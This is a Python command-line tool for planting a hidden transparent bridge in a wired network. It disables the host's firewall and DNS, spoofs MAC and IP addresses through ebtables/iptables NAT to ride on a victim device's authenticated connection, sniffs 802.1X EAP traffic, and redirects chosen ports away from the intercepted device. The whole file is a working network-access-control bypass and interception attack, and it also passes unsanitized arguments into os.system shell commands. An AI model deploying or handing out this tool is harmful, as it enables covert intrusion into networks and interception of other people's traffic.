import cmd
import os


class HiddenNetworkBridge(cmd.Cmd):
	intro = '\tTool to setup and manage a transparent bridge. Press ? to list commands.\n'
	prompt = '[XX] '

	def do_exit(self, args):
		'\tQuit program. Does not restores any settings.'
		return True


	def do_createbridge(self, args):
		'\tCreates a new transparent brige.\n\t\tParams: <interface-inside> <interface-network>\n'
		if createBridge(args):
			self.prompt = '[==] '


	def do_setupproxy(self, args):
		'\tSetup connection from host to the network proxying all traffic over the bridge\n\t\tParams: <interface-network> <MAC-gateway> <MAC-client> <IP-client>\n'
		if setupProxy(args):
			self.prompt = '[>=] '


	def do_removeproxy(self, args):
		'\tRemove connection from host to the network\n'
		removeProxy(args)
		self.prompt = '[==] '


	def do_findvars(self, args):
		'\tSniffs traffic to find out valid MAC and IP address that is used to setup the proxy' #\n\t\tParams: <interface>\n'
		findVars(args)


	def do_interceptport(self, args):
		'\tForwards any port to the host. (Note: Traffic to this port is not sent to the intercepted device)\n\t\tParams: <IP-client> <udp/tcp> <port>\n'
		interceptPort(args, False)


	def do_interceptportrange(self, args):
		'\tForwards any port to the host. (Note: Traffic to this port is not sent to the intercepted device)\n\t\tParams: <IP-client> <udp/tcp> <portrange (e.g. 22:443)>\n'
		interceptPort(args, True)


	def do_showinterceptport(self, args):
		'\tShows all ports that are forwarded to the host.\n'
		showInterceptPorts()


	def do_monitor(self, args):
		'\tMonitors all EAP packets using tcpdump\n\t\tParams: <optional: filename-to-store>\n'
		monitorEAPTraffic(args)


	def do_blocktraffic(self, args):
		'\t(Un)Block all network traffic from host to the bridge.\n\t\tParams: <optional: off>\n'

		if "false" in args.lower() or "off" in args.lower():
			BlockAllOutgoingTrafficOnBridge(False)
			self.prompt = '[>=] '
		else:
			BlockAllOutgoingTrafficOnBridge(True)
			self.prompt = '[/=] '


	def do_status(self, args):
		'\tShows current status\n'
		printStatus()


	def do_reset(self, args):
		'\tReset all network interfaces and filtering rules\n'
		removeBridgeAndRules(args)
		self.prompt = '[XX] '


	def emptyline(self):
		print(" ")


def main():
	HiddenNetworkBridge().cmdloop()


# Global Variables
# ==================

BRIDGE_MAC = '00:8c:fd:ed:54:f3'


# Core Functions
# ==================

def DisableAnyNetworkTools():
	# Stop NetworkManager
	os.system('service NetworkManager stop')

	# Stop NTP
	os.system('systemctl stop ntp')
	os.system('timedatectl set-ntp false')

	# Disable UFW to prevent rule overwrite
	os.system('ufw disable')

	# IPv6 Disable
	os.system('echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6')

	# Remove DNS entries
	os.system('echo "" > /etc/resolv.conf')


def LoadNetfilterModule():
	# Load Netfilter Module
	os.system('modprobe br_netfilter')
	os.system('echo 1 > /proc/sys/net/bridge/bridge-nf-call-iptables')


def BlockAllOutgoingTrafficOnBridge(on_off_switch):
	if on_off_switch: 
		os.system('iptables -A OUTPUT -o br0 -j DROP')
		os.system('arptables -A OUTPUT -o br0 -j DROP')
	else:
		while '-A OUTPUT -o br0 -j DROP' in os.popen("iptables -S").read().split('\n'):
			os.system('iptables -D OUTPUT -o br0 -j DROP')
		while '-A OUTPUT -j DROP -o br0' in os.popen("arptables -S").read().split('\n'):
			os.system('arptables -D OUTPUT -j DROP -o br0')


def createBridge(args):
	success, args = parseArguments(args,2)
	if success:
		ifInside, ifOutside = args

		DisableAnyNetworkTools()
		LoadNetfilterModule()

		# Create Transparent Bridge
		os.system('brctl addbr br0')
		os.system('brctl addif br0 ' + ifOutside)
		os.system('brctl addif br0 ' + ifInside )
		os.system('echo 65528 > /sys/class/net/br0/bridge/group_fwd_mask')
		os.system('ip link set br0 promisc on')
		os.system('ip link set '+ifOutside+' promisc on')
		os.system('ip link set '+ifInside+' promisc on')
		os.system('macchanger -m '+BRIDGE_MAC+' br0')

		# Disable IGMP
		os.system('echo 0 > /sys/class/net/br0/bridge/multicast_snooping')

		os.system('ip link set br0 up')
		return True
	return False


def setupProxy(args):
	success, args = parseArguments(args, 4)
	if success:
		ifOutside, gwMac, clientMac, clientIp = args

		# Deny outgoing traffic on bridge
		BlockAllOutgoingTrafficOnBridge(True)

		# Layer 2 Rewrite traffic
		os.system('ebtables -t nat -A POSTROUTING -s '+BRIDGE_MAC+' -o '+ifOutside+' -j snat --to-src '+clientMac)
		os.system('ebtables -t nat -A POSTROUTING -s '+BRIDGE_MAC+' -o br0 -j snat --to-src '+clientMac)

		# IP and Arp Tables
		os.system('ip a add 192.168.254.5/30 dev br0')
		os.system('arp -s -i br0 192.168.254.6 '+gwMac)
		os.system('ip r add default via 192.168.254.6')

		# Create IP NAT rules
		os.system('iptables -t nat -A POSTROUTING -o br0 -s 192.168.254.5 -p tcp -j SNAT --to '+clientIp+':20000-32768')
		os.system('iptables -t nat -A POSTROUTING -o br0 -s 192.168.254.5 -p udp -j SNAT --to '+clientIp+':20000-32768')
		os.system('iptables -t nat -A POSTROUTING -o br0 -s 192.168.254.5 -p icmp -j SNAT --to '+clientIp)

		# Allow outgoing traffic on bridge
		BlockAllOutgoingTrafficOnBridge(False)
		return True
	return False


def removeProxy(args):
	BlockAllOutgoingTrafficOnBridge(True)

	# remove IP and ARP tables
	os.system('ip r del default via 192.168.254.6')
	os.system('ip a del 192.168.254.5/30 dev br0')
	os.system('arp -d 192.168.254.6')

	# remove iptable Rules
	os.system('iptables -t nat -F')
	os.system('ebtables -t nat -F')

	BlockAllOutgoingTrafficOnBridge(True)


def removeBridgeAndRules(args):
	os.system('ip link set br0 down')
	os.system('brctl delbr br0')
	os.system('iptables -t nat -F')
	os.system('ebtables -t nat -F')


def monitorEAPTraffic(args):
	success, args = parseArguments(args, 0, 1)
	if success:
		ifname = 'br0'
		if (len(args) == 1):
			filename = args[0]
			os.system('tcpdump -ni '+ifname+' ether dst 01:80:c2:00:00:03 -w '+filename+' --print')
		else:
			os.system('tcpdump -ni '+ifname+' ether dst 01:80:c2:00:00:03')


def interceptPort(args, isPortrange):
	success, args = parseArguments(args, 3)
	if success:
		if isPortrange:
			clientIp, protocol, portrange = args
			os.system('iptables -t nat -A PREROUTING -i br0 -d '+clientIp+' -p '+protocol+' --match multiport --dports '+portrange+' -j DNAT --to 192.168.254.5')
		else:
			clientIp, protocol, port = args
			os.system('iptables -t nat -A PREROUTING -i br0 -d '+clientIp+' -p '+protocol+' --dport '+port+' -j DNAT --to 192.168.254.5:'+port)


def findVars(args):
	ifname = 'br0'
	os.system('tcpdump -ni '+ifname+' -e -c 5 tcp | awk -F \' \' \'{print $2 " > " $4 " # " $10 " > " $12}\'')


def showInterceptPorts():
	os.system('iptables -t nat -S | grep -i prerouting | grep -i br0')


def printStatus():
	os.system('brctl show br0')
	os.system('ip a show br0')
	os.system('ebtables -t nat -L')
	os.system('iptables -t nat -S')


def parseArguments(args, size, optionalsize=99999999999999):
	args = args.split()
	if (len(args) != size):
		if (len(args) != optionalsize):
			print("\t[!] Wrong arguments.\n\tUse help <command> to see arguments required")
			return False, args
		return True, args
	else:
		return True, args



if __name__ == '__main__':
    main()